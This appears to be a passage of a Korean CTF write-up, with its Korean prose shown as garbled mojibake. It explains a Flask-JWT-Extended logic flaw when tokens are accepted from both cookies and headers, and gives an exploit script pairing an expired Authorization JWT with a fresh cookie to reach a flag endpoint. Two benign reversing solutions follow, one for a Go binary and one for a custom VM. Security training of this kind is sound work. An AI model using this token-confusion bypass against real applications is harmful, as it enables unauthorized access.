        if location == &#x27;cookies&#x27;:
            get_encoded_token_functions.append(
                lambda: _decode_jwt_from_cookies(request_type))
        if location == &#x27;query_string&#x27;:
            get_encoded_token_functions.append(_decode_jwt_from_query_string)
        if location == &#x27;headers&#x27;:
            get_encoded_token_functions.append(_decode_jwt_from_headers)
        if location == &#x27;json&#x27;:
            get_encoded_token_functions.append(
                lambda: _decode_jwt_from_json(request_type))

    # Try to find the token from one of these locations. It only needs to exist
    # in one place to be valid (not every location).
    errors = []
    decoded_token = None
    jwt_header = None
    for get_encoded_token_function in get_encoded_token_functions:
        try:
            encoded_token, csrf_token = get_encoded_token_function()
            decoded_token = decode_token(encoded_token, csrf_token)
            jwt_header = get_unverified_jwt_headers(encoded_token)
            break
        except NoAuthorizationError as e:
            errors.append(str(e))

    # Do some work to make a helpful and human readable error message if no
    # token was found in any of the expected locations.
    if not decoded_token:
        token_locations = config.token_location
        multiple_jwt_locations = len(token_locations) != 1

        if multiple_jwt_locations:
            err_msg = &quot;Missing JWT in {start_locs} or {end_locs} ({details})&quot;.format(
                start_locs=&quot;, &quot;.join(token_locations[:-1]),
                end_locs=token_locations[-1],
                details=&quot;; &quot;.join(errors)
            )
            raise NoAuthorizationError(err_msg)
        else:
            raise NoAuthorizationError(errors[0])

    verify_token_type(decoded_token, expected_type=request_type)
    verify_token_not_blacklisted(decoded_token, request_type)
    return decoded_token, jwt_header</code></pre><p id="b61724f7-4c70-466b-9443-a1ff626b14be" class="">
</p><ul id="b718b843-c96e-4fcc-bd64-76375a899866" class="bulleted-list"><li>ìœ„ì™€ ê°™ì´ for ë°˜ë³µë¬¸ì„ ì´ìš©í•˜ì—¬ <code><strong>location</strong></code> í† í°ì´ ìˆì„ ê²ƒì´ë¼ ë¯¸ë¦¬ ì„ ì–¸ë˜ì–´ ìˆë˜ ìœ„ì¹˜ë¥¼ ëª¨ë‘ í™•ì¸í•˜ì—¬ <code><strong>get_encoded_token_functions</strong></code>ì— append í•œë‹¤. ì´ë•Œ locationì€ config.pyì— <strong>JWT_TOKEN_LOCATION</strong>ìœ¼ë¡œ ì„ ì–¸í•˜ê±°ë‚˜ <strong>app.config[&#x27;JWT_TOKEN_LOCATION&#x27;]</strong>ì— ì„ ì–¸í•  ìˆ˜ ìˆë‹¤.</li></ul><pre id="538762da-63a8-4e28-8192-560026666524" class="code"><code>    for get_encoded_token_function in get_encoded_token_functions:
        try:
            encoded_token, csrf_token = get_encoded_token_function()
            decoded_token = decode_token(encoded_token, csrf_token)
            jwt_header = get_unverified_jwt_headers(encoded_token)
            break
        except NoAuthorizationError as e:
            errors.append(str(e))</code></pre><ul id="a6ef58f4-4a14-4066-8b94-0bdd1ba57698" class="bulleted-list"><li>ì´ë•Œ ìœ„ì™€ ê°™ì´ get_encoded_token_functionsì— appendëœ ëª¨ë“  ìœ„ì¹˜ì—ì„œ í† í°ì„ íŒŒì‹±í•˜ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ appendëœ ìˆœì„œëŒ€ë¡œ tokenì„ ê²€ì‚¬í•˜ë˜, <strong>í•˜ë‚˜ê°€ ì •ìƒì ìœ¼ë¡œ íŒŒì‹±ë˜ì—ˆì„ ê²½ìš°, ë’¤ì˜ í† í°ì€ ë¬´ì‹œí•˜ë„ë¡ ì½”ë“œê°€ ì‘ì„±</strong>ë˜ì–´ ìˆë‹¤.  ë”°ë¼ì„œ í† í°ì˜ ìœ„ì¹˜ê°€ ì—¬ëŸ¬ ê³³ìœ¼ë¡œ ì§€ì •í•  ê²½ìš° ë¡œì§€ì»¬í•œ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆê³ , ì´ë²ˆ ë¬¸ì œì˜ ì»¨ì…‰ ë˜í•œ ì´ì™€ ë™ì¼í•˜ë‹¤.</li></ul><ul id="267e3b2b-703c-4566-9131-6385ceedc936" class="bulleted-list"><li>ë‹¤ì‹œ ë¬¸ì œë¡œ ëŒì•„ì™€ ëˆˆì—¬ê²¨ë´ì•¼ í•  ê²ƒì€ <strong>app.config[&#x27;JWT_TOKEN_LOCATION&#x27;]</strong>ì´ë‹¤.</li></ul><pre id="e8a66531-f279-4561-9faa-5586cc8b45c5" class="code"><code>    with app.app_context():
        app.config[&#x27;JWT_SECRET_KEY&#x27;]     = app.config[&#x27;SECRET&#x27;]
        app.config[&#x27;JWT_TOKEN_LOCATION&#x27;] = [&#x27;cookies&#x27;, &#x27;headers&#x27;]
        jwtmanager                       = JWTManager(app)

        return app</code></pre><ul id="03afb3dc-36e7-4f9c-81bf-00ab13fc3418" class="bulleted-list"><li>JWT í† í°ì˜ ìœ„ì¹˜ê°€ cookies, ê·¸ë¦¬ê³  headersë¡œ ë˜ì–´ ìˆë‹¤. <code><strong>jwt_required</strong></code>ì™€ <strong><code>get_jwt_identity()</code></strong>ì—ì„œëŠ” cookiesì— ì„ ì–¸ëœ JWT Tokenì„ í†µí•´ ê²€ì¦í•˜ê²Œ ëœë‹¤. ê·¸ëŸ¬ë‚˜ ì¸ìœ„ì ìœ¼ë¡œ Authorization í—¤ë”ë¥¼ í†µí•´ ê²€ì¦í•˜ëŠ” ê³³ì—ì„œëŠ” <code><strong>_decode_jwt_from_request</strong></code>ì—ì„œ returní•˜ëŠ” í† í°ê³¼ëŠ” ë‹¤ë¥´ë‹¤.</li></ul><ul id="d19607a1-178e-4b49-92e8-d62597e38fee" class="bulleted-list"><li>ì´ì™€ ê°™ì€ ê²€ì‚¬ ë£¨í‹´ì„ í†µí•´ ê²€ì¦í•  ê²½ìš° ë¡œì§€ì»¬í•œ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— Flask-JWT-Extendedì˜ ê²½ìš° í•´ë‹¹ ëª¨ë“ˆì—ì„œ ì œê³µí•˜ëŠ” í•¨ìˆ˜ë¡œ í† í° ê²€ì‚¬ ë° ê²€ì¦ ê°’ì„ ë°˜í™˜í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ê²ƒì´ ê¶Œì¥ëœë‹¤.</li></ul><pre id="e88d8242-5539-45c8-aad2-aea20460c1e2" class="code code-wrap"><code># exploit.py
import requests
import json
import jwt

requests.packages.urllib3.disable_warnings()

# Get Token
url     = &quot;http://ctf.kkamikoon.com/&quot;
headers = { &quot;Content-Type&quot;  : &quot;application/json; charset=utf-8&quot; }
data    = { &quot;username&quot;      : &quot;admin&quot;,
            &quot;password&quot;      : &quot;admin&quot; }

res     = requests.post(url=url + &quot;login&quot;, headers=headers, data=json.dumps(data), verify=False)
new     = json.loads(res.text)[&#x27;access_token&#x27;]

# Expired JWT == Exploit JWT
exploit_jwt     = &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1OTc4NTc4MzcsIm5iZiI6MTU5Nzg1NzgzNywianRpIjoiMzQyYjNlZTItMzQ1My00Y2IzLWFjYzgtZjMxMzcyYjU3NGEwIiwiZXhwIjoxNTk3ODU3ODAwLCJpZGVudGl0eSI6Imd1ZXN0IiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIiwiY3NyZiI6IjRmNGE4YTk3LTdiNDEtNGZiMy1iYzcxLTE0YjBiODM3ZmQyNSJ9.pJYyoZjq-6l06TQ6ugfQZjoHtSClEhW_6AvXzYjAQM8&quot; # expired
exploit_headers = {
    &quot;Authorization&quot; : f&quot;Bearer {exploit_jwt}&quot;,
    &quot;Cookie&quot;        : f&quot;access_token_cookie={new}&quot;
}

res     = requests.get(url=url + &quot;flag&quot;, headers=exploit_headers, verify=False)

print(res.text)</code></pre><h1 id="55257ad5-1d4c-4313-b0d4-feb6e529cbb4" class="">ğŸ–¥ï¸ REVERSING</h1><h2 id="dccd26d2-279c-4c94-9120-194dd56b7cd1" class="">gocat</h2><hr id="fe45f93d-643a-48d7-b716-39ce5eb0423a"/><figure id="cd0eb254-1928-4460-94c3-37116ab80aad" class="image"><a href="/assets/2020-09-01/bob/bob945.png"><img style="width:715px" src="/assets/2020-09-01/bob/bob945.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="ff250581-9e33-4179-b7b1-f4743d47b0bb"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">golang ë¦¬ë²„ì‹± &amp; ê°„ë‹¨í•œ ì—­ì—°ì‚° / 0 solver</div></figure><ul id="3886f266-d89c-492a-95ce-274eba78b576" class="bulleted-list"><li>ì£¼ì–´ì§„ ë¬¸ì œ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œë°›ê³  ë°”ì´ë„ˆë¦¬ë¥¼ idaë¡œ ì—´ê²Œë˜ë©´ ì•„ë˜ì™€ ê°™ì´ ì‹¬ë³¼ì´ ì‚´ì•„ìˆì§€ ì•Šì€ ê²ƒì²˜ëŸ¼ ë³´ì¸ë‹¤.</li></ul><figure id="dd676894-df72-4120-9e5f-9b99deb00069" class="image"><a href="/assets/2020-09-01/bob/bob946.png"><img style="width:288px" src="/assets/2020-09-01/bob/bob946.png"/></a></figure><ul id="7b6e3062-e735-446c-8eda-d82c6d871e45" class="bulleted-list"><li>í•˜ì§€ë§Œ golangì€ ì½”ë“œ ì‘ì„±ì‹œ ì‚¬ìš©í•œ íŒ¨í‚¤ì§€ì™€ ì—¬ëŸ¬ í•¨ìˆ˜ì— ëŒ€í•œ ì •ë³´ë“¤ì„ <code>gopclntab</code> ì„¹ì…˜ì— ì €ì¥í•œë‹¤. í•´ë‹¹ ì„¹ì…˜ì— ì €ì¥ ì‹œ, ì•„ë˜ì™€ ê°™ì€ êµ¬ì¡°ì²´ë¥¼ ê°€ì§„ë‹¤.</li></ul><pre id="54a2f025-dd01-4605-b64e-194a925fdc20" class="code"><code>struct _FUNCTIONINFO {
	QDWORD lpFunctionAddr,
	QDWORD qdNameOffset
}</code></pre><ul id="7e78d444-25ea-420a-a2a6-13512d8791b1" class="bulleted-list"><li>ë”°ë¼ì„œ, í•´ë‹¹ ì„¹ì…˜ì˜ êµ¬ì¡°ì²´ë¥¼ íŒŒì‹±í•´ì„œ ì˜¤ë””íŒ…ì„ ì§„í–‰í•˜ë©´ ëœë‹¤. í•˜ì§€ë§Œ ì´ ì‘ì—…ë“¤ì€ ë„ˆë¬´ ë§ì€ ë…¸ë™ì´ í•„ìš”í•˜ë¯€ë¡œ ëˆ„êµ°ê°€ ë§Œë“¤ì–´ë†“ì€ <a href="https://github.com/strazzere/golang_loader_assist">ida golang assist</a>ë¥¼ ì‚¬ìš©í•˜ë©´ ì•„ë˜ì˜ ê·¸ë¦¼ê³¼ ê°™ì´ ë¹„êµì  ê¹”ë”í•œ í•¨ìˆ˜ëª…ì„ í™•ì¸ í•  ìˆ˜ ìˆë‹¤.</li></ul><p id="ade8037f-8854-49dd-9ed5-b880e97ec060" class="">
</p><figure id="e312a978-43b1-41da-bf6b-a039fcfa8803" class="image"><a href="/assets/2020-09-01/bob/bob947.png"><img style="width:336px" src="/assets/2020-09-01/bob/bob947.png"/></a></figure><ul id="365ae891-9cfe-4fa0-a954-ac26855740ea" class="bulleted-list"><li>ìœ„ì™€ ê°™ì´ assistë¥¼ ì‚¬ìš©í•´ í•¨ìˆ˜ëª…ì„ ë°”ê¿”ì¤€ ì´í›„, main_mainí•¨ìˆ˜ë¥¼ ì°¾ì•„ì„œ ë””ì»´íŒŒì¼í•œë‹¤.</li></ul><figure id="0ecccb43-67ba-4f60-a954-c36841f0ac9f" class="image"><a href="/assets/2020-09-01/bob/bob948.png"><img style="width:624px" src="/assets/2020-09-01/bob/bob948.png"/></a></figure><ul id="d02379ac-b690-4074-8e1b-2f8ce7e6d0fd" class="bulleted-list"><li>main_mainí•¨ìˆ˜ë¥¼ ëŒ€ëµì ìœ¼ë¡œ ì‚´í´ë³´ë©´ ì–´ëŠì •ë„ êµ¬ì¡°ê°€ ëˆˆì— ë“¤ì–´ì˜¤ê²Œ ë˜ëŠ”ë° ë‹¤ìŒê³¼ ê°™ì€ pseudo codeë¡œ ë˜ì–´ìˆìŒì„ ì•Œ ìˆ˜ ìˆê³ , ì—­ì—°ì‚°ì´ ì¶©ë¶„íˆ ê°€ëŠ¥í•œ êµ¬ì¡°ì¸ ê²ƒ ë˜í•œ ì•Œ ìˆ˜ ìˆë‹¤.</li></ul><pre id="9f2e0cc3-8d28-4b77-bbc7-36376cdf1c2d" class="code"><code># pseudo code
seed = time.unixtime()
srand(seed);

for i in range(256):
	table[i] = rand()

flag = input()
if len(flag) &gt; 44:
	exit(0)

result = []
for i in range(44):
	result += [ getRandom() * table[getIndex((1 &lt;&lt; i) % 256)] + flag[i] ]

for i in range(44):
	print(i, result[i])</code></pre><ul id="f8a8acaa-2081-46fa-a703-aa1cd2575b1e" class="bulleted-list"><li>ì—¬ê¸°ì„œ ì¶”ê°€ì ìœ¼ë¡œ ë¶„ì„í•´ì•¼í•  ê²ƒì€ getIndexí•¨ìˆ˜ì¸ë°, í•´ë‹¹ í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.</li></ul><figure id="a05f98c7-e335-4061-8af1-ec0bd9f4d776" class="image"><a href="/assets/2020-09-01/bob/bob949.png"><img style="width:528px" src="/assets/2020-09-01/bob/bob949.png"/></a></figure><ul id="f4ae6464-d8de-49cd-9ef6-31cd66e29b91" class="bulleted-list"><li>ì¬ê·€ì ìœ¼ë¡œ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆëŠ”ë°, ì •ìƒì ìœ¼ë¡œ ë””ì»´íŒŒì¼ì´ ë˜ì§€ ì•ŠëŠ”ë‹¤. ì´ëŸ¬í•œ ì´ìœ  ë•Œë¬¸ì— ì–´ì…ˆ ì½”ë“œë¥¼ ë³´ì•„ì•¼í•œë‹¤.</li></ul><figure id="de03b832-f9b6-4e44-a44a-4cb16d346723" class="image"><a href="/assets/2020-09-01/bob/bob950.png"><img style="width:384px" src="/assets/2020-09-01/bob/bob950.png"/></a></figure><figure id="dbf13fef-319e-4711-9aa9-fb0c2b1f37ce" class="image"><a href="/assets/2020-09-01/bob/bob951.png"><img style="width:384px" src="/assets/2020-09-01/bob/bob951.png"/></a></figure><ul id="49148284-15b1-4f44-ba92-947131514993" class="bulleted-list"><li>ìœ„ì˜ ë‘ ê·¸ë¦¼ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯, eaxê°€ getIndexí•¨ìˆ˜ì—ì„œ ìŠ¤íƒìœ¼ë¡œ ë“¤ì–´ê°€ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆê³  ëŒ€ëµì ìœ¼ë¡œ ì•„ë˜ì™€ ê°™ì´ ë™ì‘í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><pre id="ac5c98cd-ba6b-4b4c-95de-60188d7ee6b9" class="code"><code>def getIndex(depth):
	if depth &lt; 2:
		return 1
	return (getIndex(depth - 2) + getIndex(depth - 1)) % 256</code></pre><ul id="bdd836e8-cd3f-4caa-bfd3-e06753f01f14" class="bulleted-list"><li>ìœ„ì˜ ì‹ëŒ€ë¡œ ê³„ì‚°ì„ í•˜ë©´ í”¼ë³´ë‚˜ì¹˜ ìˆ˜ì—´ì„ì„ ì•Œ ìˆ˜ ìˆëŠ”ë°, ì´ë¥¼ ì¬ê·€ì ìœ¼ë¡œ êµ¬í˜„í–ˆê¸° ë•Œë¬¸ì— 40ë²ˆì§¸ ìˆ˜ì—´ ê°’ì„ ê³„ì‚°í•˜ê¸° ìœ„í•´ì„œ ì ì§€ì•Šì€ ê³„ì‚°ì´ í•„ìš”í•˜ê²Œ ëœë‹¤. ê·¸ëŸ¬ë¯€ë¡œ memorization ì´ë‚˜ ê°„ë‹¨í•˜ê²Œ ë¯¸ë¦¬ ë°°ì—´ë¡œ ê³„ì‚°ì„ í•´ì£¼ë©´ ëœë‹¤.</li></ul><ul id="45e88f46-6ebe-446b-ac05-f9fbf1fda342" class="bulleted-list"><li>ìœ„ì˜ ì‘ì—…ë“¤ì„ ëª¨ë‘ í•©ì³ì„œ, ì—­ì—°ì‚°ì„ í•˜ê¸° ìœ„í•œ pocë¥¼ ì‘ì„±í•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.</li></ul><pre id="c2b2bc82-0a14-4e15-b74c-7576d2ce1d21" class="code"><code>package main

import (
   &quot;fmt&quot;
   &quot;math/rand&quot;
   &quot;time&quot;
)
var memory []int

func getIndex(idx int) int {
   if memory[idx] != 0 {
      return memory[idx]
   }
   if idx &lt; 2 {
      memory[idx] = 1
      return 1
   }
   result := (getIndex(idx - 2) + getIndex(idx - 1)) &amp; 0xFF
   memory[idx] = result
   return result
}

func getRandom(r *rand.Rand) int {
   return r.Int()
}

func main() {
   memory = make([]int, 0x100)
   flag_enc := []uint32{
2069409670, 2964128287, 2354096995, 3032984546, 10510900, 2544990927, 2926778951, 552570446, 1853857527, 3973419442, 3048538325, 1902664467, 420185447, 2658384181, 2929871612, 4151170943, 7446955, 2503536331, 1899187641, 3227466824, 3596188763, 2770886128, 3598361089, 3417226313, 2440643422, 157914802, 380458138, 2585576567, 3413857472, 2292452225, 2949469921, 3191119812, 3830151779, 783135889, 801108861, 50993623, 2780019976, 283706417, 64541485, 3786109553, 4159600537, 2979925216, 3157377353, 420734285,
   }
   for unix := time.Now().Unix(); unix &gt; 0; unix-- {
      r := rand.New(rand.NewSource(unix))
      table := make([]uint8, 0x100)

      for i := 0; i &lt; 0x100; i++ {
         table[i] = uint8(getRandom(r))
      }
      prefix := []byte(&quot;bob&quot;)
      found := true

      for i := 0; i &lt; len(prefix); i++ {
         calc := int(prefix[i]) + int(table[getIndex(((1 &lt;&lt; uint32(i)) % 256))]) * getRandom(r)
         if uint32(calc) != flag_enc[i] {
            found = false
            break
         }
      }
      if found == true {
         fmt.Println(&quot;[+] Found flag&quot;)
         flag := make([]byte, len(flag_enc))
         for i := len(prefix); i &lt; len(flag_enc); i++ {
            flag[i] = byte(int(uint32(flag_enc[i])) - int(table[(getIndex((1 &lt;&lt; uint32(i) % 256)))]) * getRandom(r))
         }
         fmt.Println(&quot;flag =&gt; &quot;, string(prefix) + string(flag))
         return
      }
   }
}</code></pre><p id="4e85e8bb-4a42-41fa-8ccf-b7984255e025" class="">flag: bob{DO_NOT_USING_GOLANG_PLZ_JUST_KEEP_GOING}</p><h2 id="8f7575ff-3cfc-40e1-9579-fdb8989bd585" class="">bvm-rev</h2><hr id="02c4387b-275f-4afe-8ece-fba44fc70f4b"/><figure id="447613ae-27c2-48c3-a1b4-317811e57c86" class="image"><a href="/assets/2020-09-01/bob/bob952.png"><img style="width:796px" src="/assets/2020-09-01/bob/bob952.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="ab98e7fd-7d88-4724-b8fc-92621f3a5481"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">bvm ë°”ì´ë„ˆë¦¬ì—ì„œ ë¡œë“œí•˜ëŠ” flag.bvmì˜ ì½”ë“œ íë¦„ ë¶„ì„</div></figure><p id="39f49a6b-e88e-494a-b516-336d8ad5b0d6" class="">
</p><figure id="f716673e-546f-493d-b748-4369d16e78df" class="image"><a href="/assets/2020-09-01/bob/bob953.png"><img style="width:240px" src="/assets/2020-09-01/bob/bob953.png"/></a></figure><p id="e5444b23-a59e-413e-8ca1-063157624d1b" class="">bvm íŒŒì¼ì€ ìœ„ ê·¸ë¦¼ê³¼ ê°™ì€ êµ¬ì¡°ë¥¼ ê°€ì§€ê³ , ê° ì„¹ì…˜ì€ ì½”ë“œ ì˜ì—­, ë°ì´í„° ì˜ì—­, ë³€ìˆ˜ ì˜ì—­ ë“±ìœ¼ë¡œ ì‚¬ìš©ëœë‹¤.</p><pre id="e97b85a2-9457-40cb-bef2-e30cc1f0150f" class="code"><code>struct CALLSTACK {
    uint16_t reg[4];
    uint16_t retaddr;
};

struct BVM {
    uint16_t section[32];
    uint8_t 32;
    int8_t zf;
    struct CALLSTACK callstack[6];
    int8_t cs_count;
    uint32_t size;
    uint8_t data[2048];
    uint16_t reg[4]; //ax, bx, cx, dx
    uint16_t pc;
};</code></pre><p id="dee722a8-277d-46c0-8265-91e0dcef309d" class="">ê° opcodeê°€ ì–´ë–¤ ë™ì‘ì„ í•˜ëŠ”ì§€ íŒŒì•…í•˜ê¸° ìœ„í•´ì„œëŠ” êµ¬ì¡°ì²´ë¥¼ ì •ì˜í•˜ê³  ë¶„ì„í•˜ëŠ” ê²ƒì´ í¸í•˜ë‹¤.
</p><p id="e87fe19d-3bf0-425d-b82d-d903dab198f1" class="">ê·¸ë¦¬ê³  ë¶„ì„ì„ í†µí•´ ì•„ë˜ì˜ ëª‡ê°€ì§€ ì‚¬ì‹¤ì„ ì•Œ ìˆ˜ ìˆë‹¤.</p><ol id="4939f94d-0764-41ce-99c6-aad52a7a4861" class="numbered-list" start="1"><li>4ê°œì˜ register(ax, bx, cx, dx)ë¥¼ ì‚¬ìš©í•˜ê³  ê° ë ˆì§€ìŠ¤í„°ì™€ ëª¨ë“  ì—°ì‚°ì²˜ë¦¬ëŠ” 2bytes í¬ê¸°ë¥¼ ê°€ì§„ë‹¤.</li></ol><ol id="ebed46a2-d044-4844-85e9-562ae4d56e00" class="numbered-list" start="2"><li>CALL instructionì„ í˜¸ì¶œí•  ë•Œ registerì™€ ëŒì•„ì˜¬ ì£¼ì†Œë¥¼ ë°±ì—…í•˜ê³ , RETURNì„ ë§Œë‚˜ë©´ ax registerë¥¼ ì œì™¸í•œ registerë¥¼ ë³µì›í•˜ê³  ëŒì•„ì˜¬ ì£¼ì†Œë¡œ pcë¥¼ ë³€ê²½í•œë‹¤.</li></ol><ol id="97d819de-0640-46ec-90f3-b8c6342796ba" class="numbered-list" start="3"><li>ê²½ê³„(boundary)ë¥¼ ë„˜ì–´ì„œëŠ” ì°¸ì¡°ê°€ ë°œê²¬ë˜ë©´ í”„ë¡œê·¸ë¨ì´ ì¢…ë£Œëœë‹¤. (ì¼ë¶€ opcodeì—ì„œëŠ” ê²½ê³„ ê²€ì‚¬ë¥¼ í•˜ì§€ ì•ŠëŠ”ë‹¤)</li></ol><p id="7a4c8bee-cb4c-461e-8642-ff18e8433774" class="">
</p><pre id="f2cb0fdd-ce1d-4cd4-8a5f-28c0d64f86b7" class="code code-wrap"><code>.KEY
db 170, 68, 138, 0, 142, 162, 151, 226, 51, 148, 151, 94, 14, 185, 161, 33


.ENC_FLAG
db 123, 120, 140, 153, 192, 37, 165, 150, 203, 23, 199, 222, 164, 129, 2, 229, 59, 56, 195, 97, 207, 108, 50, 51, 153, 248, 39, 72, 122, 0, 93, 44, 113


.GET_FLAG_LENGTH
MOVE ax, SECTION#INPUT_FLAG
MOVE cx, 0
:LABEL_1
MOVE bx, ax
ADD bx, cx
MOVE bx, [bx]
AND bx, 255
COMP bx, 0
JE LABEL_2
COMP bx, 10 // &#x27;\n&#x27;
JE LABEL_2
ADD cx, 1
JMP LABEL_1
:LABEL_2
MOVE ax, cx
RETURN

.ROL
MOVE cx, bx
MOD cx, 8
MOVE bx, 8
SUB bx, cx
RSHIFT cx, ax, bx

MOVE dx, 8
SUB dx, bx
MOVE bx, dx

LSHIFT dx, ax, bx
MOVE bx, 8
LSHIFT ax, cx, bx
SUB dx, ax
MOVE ax, dx
ADD ax, cx
RETURN


.FLAG_CHECK
MOVE cx, 0

:LABEL_3
MOVE ax, SECTION#INPUT_FLAG
ADD ax, cx
MOVE ax, [ax]
AND ax, 255
MOVE bx, cx
CALL ROL
MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE [bx], ax

MOVE ax, SECTION#KEY
MOVE bx, cx
MOD bx, 16
ADD ax, bx
MOVE dx, [ax]
AND dx, 255

MOVE ax, SECTION#INPUT_FLAG
MOVE bx, cx
ADD bx, 1
MOD bx, 33
ADD ax, bx
MOVE ax, [ax]
AND ax, 255

ADD dx, ax
MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE ax, [bx]
XOR ax, dx
AND ax, 255

MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE [bx], ax

ADD cx, 1
COMP cx, 33
JNE LABEL_3

MOVE cx, 0
MOVE dx, 1

:LABEL_4
MOVE ax, SECTION#RESULT_FLAG
ADD ax, cx
MOVE ax, [ax]
AND ax, 255
MOVE bx, SECTION#ENC_FLAG
ADD bx, cx
MOVE bx, [bx]
AND bx, 255
COMP ax, bx
JE LABEL_5
MOVE dx, 0
:LABEL_5

ADD cx, 1
COMP cx, 33
JNE LABEL_4
MOVE ax, dx
RETURN


.STRING_CHECK_YOUR_FLAG
string &quot;Check your flag: &quot;


.STRING_CORRECT
string &quot;Correct !!\n&quot;


.STRING_INCORRECT
string &quot;Wrong ...\n&quot;


.INPUT_FLAG
empty 50


.RESULT_FLAG
empty 34


.MAIN
MOVE cx, 17
MOVE bx, SECTION#STRING_CHECK_YOUR_FLAG
MOVE ax, 1
SYSCALL

MOVE cx, 48
MOVE bx, SECTION#INPUT_FLAG
MOVE ax, 0
SYSCALL

CALL GET_FLAG_LENGTH
COMP ax, 33
JNE LABEL_6

CALL FLAG_CHECK
COMP ax, 1

JNE LABEL_6
MOVE cx, 11
MOVE bx, SECTION#STRING_CORRECT
MOVE ax, 1
SYSCALL
RETURN

:LABEL_6
MOVE cx, 10
MOVE bx, SECTION#STRING_INCORRECT
MOVE ax, 1
SYSCALL
RETURN</code></pre><p id="193e6bb9-29cf-41ce-affa-9752dbf58d7e" class="">bvm ë°”ì´ë„ˆë¦¬ ë¶„ì„ì„ í†µí•´ ê° bvm opcodeë¥¼ í•´ì„í•˜ê³  flag.bvmì„ ìœ„ì™€ ê°™ì´ disassembleí•œë‹¤.</p><p id="6cff05ce-75a0-4167-88ce-9010396c473f" class="">
</p><pre id="8b682fa9-5861-4c17-bc93-e2212075fcfa" class="code code-wrap"><code>def ROL(data, shift):
    shift %= 8
    remains = data &gt;&gt; (8 - shift)
    body = (data &lt;&lt; shift) - (remains &lt;&lt; 8)
    return (body + remains)

def GET_FLAG_LENGTH(inp):
    return len(inp)

ENC_FLAG = [123, 120, 140, 153, 192, 37, 165, 150, 203, 23, 199, 222, 164, 129, 2, 229, 59, 56, 195, 97, 207, 108, 50, 51, 153, 248, 39, 72, 122, 0, 93, 44, 113]
KEY = [170, 68, 138, 0, 142, 162, 151, 226, 51, 148, 151, 94, 14, 185, 161, 33]

INPUT_FLAG = list(input(&quot;Check your flag: &quot;).encode())
if GET_FLAG_LENGTH(INPUT_FLAG) != 33:
    exit(0)

RESULT_FLAG = [0] * 33

for i in range(33):
    RESULT_FLAG[i] = ROL(INPUT_FLAG[i], i)
    RESULT_FLAG[i] ^= KEY[i % 16] + INPUT_FLAG[(i + 1) % 33]
    RESULT_FLAG[i] &amp;= 0xFF

if RESULT_FLAG == ENC_FLAG:
    print(&quot;Correct !!&quot;)
else:
    print(&quot;Wrong ..&quot;)</code></pre><p id="605bbd8c-8888-404b-b522-461b5e8e6a60" class="">disassmbleí•œ ê²°ê³¼ë¥¼ pythonìœ¼ë¡œ í¬íŒ…í•œë‹¤.</p><p id="a84518c4-3e41-4e53-b8c0-bb8d137b0fe1" class="">
</p><pre id="2a8e67a1-5f9c-42c8-8b02-84646f4500b5" class="code code-wrap"><code>def ROR(data, shift):
    shift %= 8
    body = data &gt;&gt; shift
    remains = (data &lt;&lt; (8 - shift)) - (body &lt;&lt; 8)
    return (body + remains)


KEY = [170, 68, 138, 0, 142, 162, 151, 226, 51, 148, 151, 94, 14, 185, 161, 33]
ENC_FLAG = [123, 120, 140, 153, 192, 37, 165, 150, 203, 23, 199, 222, 164, 129, 2, 229, 59, 56, 195, 97, 207, 108, 50, 51, 153, 248, 39, 72, 122, 0, 93, 44, 113]

FLAG = [0] * 33
FLAG[0] = ord(&#x27;b&#x27;) # prefix &quot;bob{&quot;

for i in range(32, -1, -1):
    FLAG[i] = ROR(ENC_FLAG[i] ^ (FLAG[(i + 1) % 33] + KEY[i % 16]) &amp; 0xFF, i)

print(&quot;FLAG =&gt; {}&quot;.format(bytes(FLAG)))
# FLAG =&gt; b&#x27;bob{BVM_Wi1l_C0m2_B@ck_N2xt_T1me}&#x27;</code></pre><p id="c857e070-befc-4dde-a546-dd9a94e82d62" class="">ì´ê²ƒì„ ì—­ì—°ì‚°í•˜ëŠ” ì½”ë“œë¥¼ ì‘ì„±í•˜ë©´ flagë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.</p><p id="c61f294c-7cf3-4239-9ccd-e2cb499a0f41" class="">
</p><p id="c68495fd-926f-458d-be22-13dacd1a0afb" class="">í•´ë‹¹ ë°©ì‹ ì´ì™¸ì— ë¹„êµ opcode(0x9, 0x19)ì— BPë¥¼ ê±¸ê³  inputì— ë”°ë¼ ë³€í™”í•˜ëŠ” registerë¥¼ ë³´ê³  ê·œì¹™ì„ ì°¾ì•„ flagë¥¼ ê°„ì ‘ì ìœ¼ë¡œ ì¶”ì¶œí•˜ëŠ” ë°©ë²•ë„ ê°€ëŠ¥í•˜ë‹¤.</p><p id="6bc8cea7-410f-47b9-9545-d7737d79d783" class="">
